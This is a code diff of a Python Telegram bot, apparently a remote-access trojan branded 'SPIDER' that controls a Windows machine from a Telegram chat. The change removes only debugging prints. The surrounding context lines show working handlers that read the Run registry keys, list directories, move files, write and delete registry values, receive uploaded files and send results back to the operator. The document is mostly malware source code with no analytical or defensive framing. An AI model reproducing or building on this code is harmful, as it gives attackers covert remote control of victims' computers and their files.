@@ -104,8 +104,6 @@ def echo_all(message):
         ibut_keyboard.add(ibut_keyboard3,ibut_keyboard4)
 
         b = message.text
-        print(b)
-        print(file_otpr)
         if sravn(message.from_user.id) == True:
             if "help_"in b:
                 path = b.split("help_")[1]
@@ -200,7 +198,6 @@ def echo_all(message):
 
                 run_registry_keys = get_run_keys()
                 s=0
-                print(235234)
                 if run_registry_keys:
                     for name, value in run_registry_keys.items():
                         s+=1
@@ -222,7 +219,6 @@ def echo_all(message):
                     x=a+"\n"+x
                     end = x.replace("/","\\")
             elif "dir"in b:
-                    print(234)
                     a=b.split("dir")[1][1:]
                     x = ""
                     s = 0
@@ -239,8 +235,6 @@ def echo_all(message):
                 a = b.split("move")[1][1:]
                 olf = a.split("to")[0].replace(" to ", "").strip()
                 new = a.replace(olf, "").replace("to", "").strip()
-                print(olf)
-                print(new)
                 shutil.move(olf, new)
                 end = "|SPIDER| - MOVE FILES\nMOVE `"+olf+"` TO `"+new+"`"
             elif "regcr"in b:
@@ -257,7 +251,6 @@ def echo_all(message):
                 value = b.split("regcr")[1][1:].split(",")[2]
                 write_registry_value(key_path, value_name, value)
                 end = "|SPIDER| - CREATE FILE IN REGISTRY EDITOR\n`"+b.split("regcr")[1][1:].split(",")[0]+"`\n`"+b.split("regcr")[1][1:].split(",")[1]+"`\n`"+b.split("regcr")[1][1:].split(",")[2]+"`\n"
-                print(end)
             elif "regdel"in b:
                 def delete_registry_value(path, value_name):
                         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
@@ -281,9 +274,6 @@ def echo_all(message):
 
 
             elif b==None and file_otpr:
-                print(1231)
-                print(message.document.file_id)
-                print(message.document.file_name)
                 file_info = bot.get_file(message.document.file_id)
                 downloaded_file = bot.download_file(file_info.file_path)
 
@@ -429,7 +419,6 @@ def echo_all(message):
                 bot.send_message(message.chat.id, endV2, parse_mode='MarkdownV2')
 
             if len(end)>0:
-                print(23)
                 if len(end)<=4096:
                     bot.send_message(message.chat.id, end, parse_mode='Markdown')
 
@@ -441,8 +430,7 @@ def echo_all(message):
 
                     # Отправляем файл
                     bot.send_document(message.chat.id, file_stream, caption='THE ANSWER IS TO LONG',visible_file_name="text.txt")
-            else:
-                print(78)
+            else:pass
 
     except Exception as b:
         bot.send_message(message.chat.id, str(b))
@@ -465,7 +453,6 @@ def callback_query(call):
 def handle_document(message):
     try:
         global file_otpr,file_otpr_dir
-        print(1)
         try:
             file_info = bot.get_file(message.document.file_id)
         except AttributeError:
